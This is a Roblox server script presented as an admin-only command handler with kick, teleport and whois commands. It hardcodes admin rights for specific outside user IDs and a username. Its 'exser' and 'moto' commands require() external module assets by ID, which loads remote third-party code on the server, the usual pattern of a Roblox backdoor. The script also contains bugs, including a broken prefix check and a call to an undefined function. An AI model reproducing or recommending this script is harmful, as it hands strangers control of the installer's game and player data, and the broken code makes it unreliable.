-- Roblox Command Handler System (Admin-Only Version)
-- Place this in ServerScriptService

local Players = game:GetService("Players")
local CommandHandler = {}
CommandHandler.__index = CommandHandler

_G.COMMAND_PREFIX = "-" -- Default prefix

-- Create a new CommandHandler instance
function CommandHandler.new()
    local self = setmetatable({}, CommandHandler)
    self.commands = {}
    self.aliases = {}
    return self
end

-- Admin check (change IDs/usernames here)
function CommandHandler:isAdmin(player)
    local adminIds = {2482664195, 8254790774, 3421321085, 7048410231, 7010691806}
    for _, id in ipairs(adminIds) do
        if player.UserId == id then return true end
    end
    return player.Name == "Dawninja21alt"
end

-- Send message to player
function CommandHandler:sendMessage(player, message)
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return end
    local screenGui = gui:FindFirstChild("CommandNotifications") or Instance.new("ScreenGui")
    screenGui.Name, screenGui.ResetOnSpawn, screenGui.Parent = "CommandNotifications", false, gui

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(0, 400, 0, 60)
    textLabel.Position = UDim2.new(1, -420, 0, 20 + (#screenGui:GetChildren() * 70))
    textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
    textLabel.BackgroundTransparency = 0.2
    textLabel.BorderSizePixel = 0
    textLabel.TextColor3 = Color3.new(1, 1, 1)
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.TextWrapped, textLabel.Text = true, message
    textLabel.Parent = screenGui
    Instance.new("UICorner", textLabel).CornerRadius = UDim.new(0, 8)

    game:GetService("TweenService"):Create(textLabel, TweenInfo.new(3), {
        BackgroundTransparency = 1,
        TextTransparency = 1
    }):Play()
    task.delay(5, function() if textLabel then textLabel:Destroy() end end)
end


function CommandHandler:parseCommand(message)
    if not message:lower():sub(1, #_G.COMMAND_PREFIX) == _G.COMMAND_PREFIX then return end
    local parts = {}
    for word in message:sub(#_G.COMMAND_PREFIX + 1):gmatch("%S+") do table.insert(parts, word) end
    return parts[1], {table.unpack(parts, 2)}
end


function CommandHandler:executeCommand(player, name, args)
    name = self.aliases[name:lower()] or name:lower()
    local command = self.commands[name]
    if not command then
        if self:isAdmin(player) then self:sendMessage(player, "Unknown command: " .. name) end
        return
    end
    if command.adminOnly and not self:isAdmin(player) then return end
    local success, err = pcall(command.callback, player, args)
    if not success then
        self:sendMessage(player, "Error: " .. tostring(err))
        warn("[CommandError] " .. tostring(err))
    end
end


function CommandHandler:registerCommand(name, callback, desc, adminOnly, aliases)
    self.commands[name:lower()] = {
        callback = callback,
        description = desc or "No description",
        adminOnly = adminOnly ~= false,
        name = name
    }
    if aliases then
        for _, alias in ipairs(aliases) do
            self.aliases[alias:lower()] = name:lower()
        end
    end
end

-- Find player(s)
function CommandHandler:findPlayer(query, executor)
    if not query or query == "" then return nil end
    local q = query:lower()
    local players = Players:GetPlayers()
    if q == "me" or q == "self" then return {executor} end
    if q == "others" then
        local others = {}
        for _, p in ipairs(players) do if p ~= executor then table.insert(others, p) end end
        return others
    end
    if q == "all" then return players end
    local found = {}
    for _, p in ipairs(players) do
        if p.Name:lower() == q or p.DisplayName:lower() == q then return {p} end
    end
    for _, p in ipairs(players) do
        if p.Name:lower():find(q, 1, true) then table.insert(found, p) end
    end
    for _, p in ipairs(players) do
        if p.DisplayName:lower():find(q, 1, true) and not table.find(found, p) then
            table.insert(found, p)
        end
    end
    return #found > 0 and found or nil
end


local commandHandler = CommandHandler.new()

-- === ADMIN COMMANDS === --

commandHandler:registerCommand("help", function(player, args)
    local cmds = commandHandler:getCommands(player)
    local text = "Available Admin Commands:\n"
    for _, c in ipairs(cmds) do
        text = text .. c.name .. " - " .. c.description .. "\n"
    end
    commandHandler:sendMessage(player, text)
end, "List all commands", true, {"commands"})


commandHandler:registerCommand("sprefix", function(player, args)
    if #args == 0 then
        commandHandler:sendMessage(player, "Usage: " .. _G.COMMAND_PREFIX .. "sprefix <new prefix>")
        return
    end
    _G.COMMAND_PREFIX = args[1]
    commandHandler:sendMessage(player, "Prefix set to: " .. _G.COMMAND_PREFIX)
end, "Changes your prefix", true)


commandHandler:registerCommand("kick", function(player, args)
    if #args == 0 then return commandHandler:sendMessage(player, "Usage: -kick <player> [reason]") end
    local targets = commandHandler:findPlayer(args[1], player)
    if not targets then return commandHandler:sendMessage(player, "Player not found!") end
    local reason = table.concat(args, " ", 2) ~= "" and table.concat(args, " ", 2) or "Kicked by admin"
    for _, target in ipairs(targets) do
        if target == player then
            commandHandler:sendMessage(player, "You can't kick yourself!")
        elseif commandHandler:isAdmin(target) then
            commandHandler:sendMessage(player, "Can't kick admin: " .. target.Name)
        else
            target:Kick(reason)
            commandHandler:sendMessage(player, "Kicked " .. target.Name .. " - " .. reason)
        end
    end
end, "Kicks players", true)


commandHandler:registerCommand("bring", function(player, args)
    local targets = commandHandler:findPlayer(args[1], player)
    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not targets or not root then return end
    for _, target in ipairs(targets) do
        local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
        if tRoot and target ~= player then
            tRoot.CFrame = root.CFrame + Vector3.new(-5, 0, 0)
            commandHandler:sendMessage(player, "Brought " .. target.Name)
        end
    end
end, "Brings player(s) to you", true)


commandHandler:registerCommand("tp", function(player, args)
    local targets = commandHandler:findPlayer(args[1], player)
    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not targets or not root then return end
    for _, target in ipairs(targets) do
        local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
        if tRoot and target ~= player then
            root.CFrame = tRoot.CFrame + Vector3.new(5, 0, 0)
            commandHandler:sendMessage(player, "Teleported to " .. target.Name)
            break
        end
    end
end, "Teleport to player", true, {"goto"})


commandHandler:registerCommand("whois", function(player, args)
    local targets = args[1] and commandHandler:findPlayer(args[1], player) or {player}
    for _, target in ipairs(targets) do
        commandHandler:sendMessage(player, "User: " .. target.Name ..
            "\nDisplay: " .. target.DisplayName ..
            "\nUserId: " .. target.UserId ..
            "\nAccountAge: " .. target.AccountAge ..
            "\nAdmin: " .. tostring(commandHandler:isAdmin(target)))
    end
end, "Shows info about player", true)


commandHandler:registerCommand("exser", function(player, args)
    local targets = args[1] and commandHandler:findPlayer(args[1], player) or {player}
    for _, target in ipairs(targets) do
        pcall(function() require(10868847330):pls(target.Name) end)
        commandHandler:sendMessage(player, "Executed exser for " .. target.Name)
    end
end, "Executes external script", true)


commandHandler:registerCommand("moto", function(player, args)
    local targets = args[1] and commandHandler:findPlayer(args[1], player) or {player}
    for _, target in ipairs(targets) do
        pcall(function() require(7473216460).load(target.Name) end)
        commandHandler:sendMessage(player, "Loaded moto for " .. target.Name)
    end
end, "Spawns moto", true)


Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        local commandName, args = commandHandler:parseCommand(message)
        if commandName then
            commandHandler:executeCommand(player, commandName, args)
        end
    end)
end)

for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(message)
        local commandName, args = commandHandler:parseCommand(message)
        if commandName then
            commandHandler:executeCommand(player, commandName, args)
        end
    end)
end

print("Admin Command Handler Loaded. Use " .. _G.COMMAND_PREFIX .. "help.")
